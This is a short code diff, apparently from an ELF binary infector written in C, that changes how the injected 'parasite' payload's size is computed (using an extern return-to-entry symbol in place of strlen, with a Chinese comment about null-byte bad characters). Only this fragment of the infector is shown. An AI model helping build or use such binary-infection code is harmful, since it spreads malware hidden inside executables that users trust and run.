@@ -25,6 +25,7 @@
 #define PAGE_SIZE 4096
 #define TMP "tmp.bin"
 
+extern int return_entry_start;
 struct stat st;
 char *host;
 
@@ -53,16 +54,15 @@ int main(int argc, char **argv)
         Elf64_Phdr *p_hdr;
 	
 	usage:
-	if (argc < 3)
+	if (argc < 2)
 	{
-		printf("Usage: %s <elf-host> <size-of-parasite>\n",argv[0]); 
+		printf("Usage: %s <elf-host>\n",argv[0]); 
 		exit(-1);
 	}
  	 
-	parasite_size = atoi(argv[2]);
 	host = argv[1];
-	//舍弃外部参数输入，直接sizeof计算
-	parasite_size = strlen(parasite);
+	//舍弃外部参数输入，直接sizeof计算, 不可strlen,会有\x00坏字符
+	parasite_size = return_entry_start + 6;
 	printf("Length of parasite is %d bytes\n", parasite_size);
 	
 	if ((fd = open(argv[1], O_RDONLY)) == -1)
@@ -149,7 +149,6 @@ void mirror_binary_with_parasite(unsigned int psize, unsigned char *mem, char *p
 	 * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
 	 * end_of_text += p_hdr->p_filesz;
 	 */ 
-	extern int return_entry_start;
 
 	printf("Mirroring host binary with parasite %d bytes\n",psize);
 
